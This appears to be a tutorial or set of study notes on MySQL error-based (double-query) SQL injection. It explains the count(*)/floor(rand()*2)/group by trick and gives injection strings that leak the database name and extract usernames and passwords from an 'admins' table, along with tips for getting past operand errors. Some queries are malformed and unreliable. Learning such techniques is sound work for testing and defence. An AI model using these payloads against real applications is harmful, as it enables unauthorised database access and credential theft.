
# Error based SQLi
**TL;DR we extract info via forced error messages. We do this by causing multiple entries for the same temp table ID.**  
[Source_1](https://medium.com/cybersecurityservices/sql-injection-double-query-injection-sudharshan-kumar-8222baad1a9c)
Bu putting together a query which will create a temporary table by generating int 0-1 for each row of data, ad then grouping them by whichever int this happens to be. If the values end up the same form repeated runs, an error is produced which concede information pertaining to whatever it was we were selecting from.

So the two trick parts, count(*) and rand() are both needed so that MySQL actually runs this multiple times, instead of just optimizing past it. But the trick is to create a temporary table that has duplicate keys, and let MySQL tell us about the value of that key in an error.
EG

### `Select count(*), Select floor(rand()*2)a from users group by a`
<pre>
+----------+---+  
| count(*) | a |  
+----------+---+  
|       10 | 0 |  
|        3 | 1 |  
+----------+---+  
</pre>
After running repeatedly eventually all values will end up either 0 or 1, thus erring out

`Count(*)` – displays number of rows in table  
`Floor()` – reduces a decimal to the floor (nearest possible integer)  
`Rand()*2` – generates a random decimal between 0 and 1, the *2 adds   another integer so it becomes between 0 and 2  
`Group by` – will aggregate the same values in the column, in this case the assigned alias is “a”
Further enumeration can be carried out by going after  information_schema.tables:

### `' or (Select count(*),concat((select database()),"+",floor(rand()*2))a from information_schema.tables group by a)#`  
  
  
`concat` concatenates 2 strings and `database()` pulls the name of the current DB, thus we concatenate current DB along with "a" from info schema

when this eventually errors out,as you probably guessed, the current db name will be yielded in the error.  

We may get an error regarding too many columns for operand if the injection vector contains `AND` as it operates on 2 operands. We can navigate out of this by nesting our entire existing query string, thus making the whole thing 1 table for a selectstatement work on, with alias `b`

`and (select 1 from (Select count(*),concat((select database()),”+”, Select floor(rand()*2)a from information_schema.tables group by a)b`

We can play aroun with other commands as below:

`' or (select 1 from (Select count(*),concat((select database()),"+",floor(rand()*2))a from information_schema.tables group by a)b)#` 
`' or (select 1 from (Select count(*),concat((select username from admins),"+",floor(rand()*2))a from information_schema.tables group by a)b)`  
`' or (select 1 from (Select count(*),concat((select password from admins),"+",floor(rand()*2))a from information_schema.tables group by a)b)#`  

_'Operand should contain 1 column(s)' = prepend `(select 1`  
'Subquery returns more than 1 row' = keep running the query until error!_

